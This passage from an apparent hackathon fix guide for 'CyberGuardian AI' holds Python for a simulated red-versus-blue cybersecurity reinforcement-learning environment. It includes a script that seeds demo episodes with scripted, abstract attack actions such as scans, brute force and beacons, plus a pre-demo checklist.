        "new_alerts": new_alerts,    # Correlated alerts from this step
        "step": self.current_step,
    }

    return observation, rewards, terminated, truncated, info


def __init__(self, num_hosts=20, max_steps=100, render_mode=None):
    super().__init__()
    # ... your existing init code ...

    # MAKE SURE THESE ARE INITIALIZED:
    self.log_generator = LogGenerator()
    self.correlator = CrossLayerCorrelator()
    self.compromised_hosts = set()
    self.isolated_hosts = set()
    self.patched_hosts = set()
    self.detected_compromises = set()
    self.true_positives = 0
    self.false_positives = 0
    self.red_caught = False
    self.data_exfiltrated = 0.0
    self.red_position = 0
    self.logs = []
```

---

## SECTION 5: DEMO DATA SEED SCRIPT — 2 SIMULTANEOUS ATTACKS

### PS Requirement
"Seed your demo dataset with at least two active attack scenarios
running SIMULTANEOUSLY (e.g., a brute force attempt + a C2 beacon)"

### The Fix

```python
# FILE: scripts/seed_demo_data.py
# Run this before the hackathon demo: python scripts/seed_demo_data.py

"""
Seeds the database with 3 pre-run episodes:
  - easy:   Brute force only
  - medium: Brute force (host 0) + C2 beacon (host 5) SIMULTANEOUSLY  ← PS requirement
  - hard:   Full APT chain + false positive
"""

import sys
sys.path.insert(0, ".")

from src.environment.cyber_env import CyberSecurityEnv
from stable_baselines3 import PPO
import json, uuid
from datetime import datetime

def run_seeded_episode(
    scenario_name: str,
    force_red_actions: list = None,
    max_steps: int = 50,
):
    """
    Run a scripted episode with forced Red Agent actions.
    force_red_actions: list of (step, target, action_type) tuples to inject.
    """
    env = CyberSecurityEnv(num_hosts=20, max_steps=max_steps)
    obs, info = env.reset()

    episode_logs = []
    episode_steps = []

    for step in range(max_steps):
        # Inject forced actions for demo scenarios
        forced = next(
            (a for a in (force_red_actions or []) if a[0] == step), None
        )

        if forced:
            _, target, action_type = forced
            red_action = [target, action_type]
        else:
            # Default: scan then exploit then beacon
            if step < 5:
                red_action = [0, 0]   # scan DMZ-01
            elif step < 10:
                red_action = [0, 1]   # exploit DMZ-01
            elif step < 20:
                red_action = [2, 2]   # lateral move to APP-01
            else:
                red_action = [2, 4]   # beacon from APP-01

        blue_action = [0, 0]   # Blue monitors (for seeding purposes)

        action = {"red_action": red_action, "blue_action": blue_action}
        obs, rewards, terminated, truncated, info = env.step(action)

        episode_logs.extend(info.get("logs", []))
        episode_steps.append({
            "step": step,
            "red_action": red_action,
            "blue_action": blue_action,
            "rewards": rewards,
            "new_alerts": info.get("new_alerts", []),
            "logs": info.get("logs", []),
        })

        if terminated or truncated:
            break

    print(f"✓ Scenario '{scenario_name}' seeded: {len(episode_steps)} steps, "
          f"{len(episode_logs)} logs")
    return episode_steps


# ─── MEDIUM SCENARIO: TWO SIMULTANEOUS ATTACKS ─────────────────────────────────
# This is the CRITICAL demo scenario that satisfies the PS requirement.
# 
# Attack 1: Brute force on DMZ-01 (steps 0-10)
# Attack 2: C2 beacon from HOST-05 (steps 5 onwards — OVERLAPPING with attack 1)
# These run at the SAME TIME to satisfy "two simultaneous attack scenarios"

MEDIUM_SCENARIO_ACTIONS = [
    # Steps 0-4: Scan + Brute force on DMZ-01
    (0,  0, 0),   # scan DMZ-01
    (1,  0, 0),   # scan DMZ-01 again
    (2,  0, 1),   # exploit DMZ-01 (brute force — may fail)
    (3,  0, 1),   # exploit DMZ-01 again
    (4,  0, 1),   # exploit DMZ-01 again

    # Steps 5 onwards: SIMULTANEOUSLY start C2 beacon from a DIFFERENT host
    # (simulates a pre-existing compromise on host 5)
    (5,  0, 1),   # brute force continues on DMZ-01
    (5,  5, 4),   # ← beacon from HOST-05 AT THE SAME STEP  (inject separately)
    (6,  5, 4),   # beacon continues
    (7,  0, 1),   # brute force continues
    (7,  5, 4),   # beacon continues
    (8,  0, 2),   # lateral move after exploit succeeds
    (8,  5, 4),   # beacon still going
]

if __name__ == "__main__":
    print("Seeding demo scenarios...")
    run_seeded_episode("easy",   force_red_actions=[(0,0,1),(1,0,1),(2,0,1)], max_steps=30)
    run_seeded_episode("medium", force_red_actions=MEDIUM_SCENARIO_ACTIONS, max_steps=50)
    run_seeded_episode("hard",   force_red_actions=None, max_steps=100)
    print("\nAll demo scenarios seeded. Ready for hackathon.")
```

---

## QUICK CHECKLIST — RUN THROUGH THIS BEFORE THE DEMO

```
BACKEND CHECKLIST:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

□  LogGenerator.generate_all_layers() called for every Red action?
   → grep -n "generate_all_layers" src/environment/cyber_env.py
   → Should appear 5 times (one per hostile action)

□  All 3 log layers have 'correlation_id' field?
   → Print a sample log. All 3 dicts should share same correlation_id.

□  False positive seeded at step 15?
   → Look for is_false_positive_seed=True in your logs
   → Correlator should return is_likely_false_positive=True for its alert

□  Benign traffic generated every step?
   → Check log output — you should see "normal_traffic" action_type logs

□  Correlator receives logs BEFORE step() returns?
   → correlator.ingest() called inside step(), not outside

□  info dict contains 'new_alerts' list?
   → Print info after each step. new_alerts should be a list (can be empty)

□  Two simultaneous attacks visible in medium scenario?
   → Run seed_demo_data.py and check that steps 5-8 have BOTH
     "exploit" and "beacon" logs in the same step's log output

□  API returns new_alerts in WebSocket step message?
   → Check FastAPI WebSocket handler includes info["new_alerts"]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

*Backend Fix Prompt v1.0 | CyberGuardian AI | Hack Malenadu '26*
